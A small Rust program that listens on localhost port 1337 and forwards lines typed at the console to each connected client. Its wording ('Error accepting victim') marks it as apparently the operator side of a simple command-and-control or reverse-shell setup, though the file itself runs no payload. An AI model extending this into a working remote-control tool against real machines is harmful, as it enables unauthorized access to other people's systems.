use std::{io::{self, Write}, net::{TcpListener, TcpStream}};


fn handle_client(mut stream: TcpStream) -> Result<(), String>{
    println!("Client connected: {:#?}", stream);

    // let mut buff = [0; 1024];
    let mut instruct = String::new();

    
    loop {
        instruct.clear(); // Clear the buffer

        // Read from CLI
        io::stdin()
            .read_line(&mut instruct)
            .map_err(|e| e.to_string())?;

        if instruct.trim().to_ascii_lowercase() == "q" {
            break;
        }
        
        match stream.write_all(instruct.trim().as_bytes()) {
            Ok(_) => (),
            Err(e) => return Err(e.to_string())
        };
    }

    
    Ok(())
}


fn main() {
    let listener = TcpListener::bind("127.0.0.1:1337")
        .expect("the port can not be opened...");

    println!("Listing on port: 1337");

    for stream in listener.incoming(){
        match stream {
            Ok(stream) =>  {
                match handle_client(stream) {
                    Ok(_) => (),
                    Err(err) => eprintln!("{}", err)
                }

            },
            Err(error) => {
                eprintln!("Error accepting victim: {}", error)
            }
        }
    }
}